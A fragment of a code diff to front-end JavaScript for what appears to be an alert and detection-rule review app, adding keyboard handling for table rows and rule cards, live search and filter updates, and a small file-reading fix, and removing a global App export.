+    if (e.key === "Escape" && els.drawer.firstChild) { closeDrawer(); return; }
+    if (e.key !== "Enter" && e.key !== " ") return;
+    const t = e.target.closest && e.target.closest("tr[data-action], .rulecard[data-action]");
+    if (t) { e.preventDefault(); HANDLERS[t.dataset.action](t); }
+  });
+  els.search.addEventListener("input", renderAlerts);
+  els.filters.addEventListener("change", renderAlerts);
   els.file.addEventListener("change", e => {
     const f = e.target.files[0]; if (!f) return;
-    const r = new FileReader(); r.onload = () => analyzeText(r.result, f.name); r.readAsText(f);
+    const r = new FileReader(); r.onload = () => analyzeText(String(r.result), f.name); r.readAsText(f);
   });
-
-  window.App = {tab, loadSample, loadAll, renderAlerts, open: openDrawer, closeDrawer,
-    saveIr, exportIncident, selectRule, newRule, saveRule, deleteRule, resetRules, exportRules};
 
   renderRuleList();
 })();
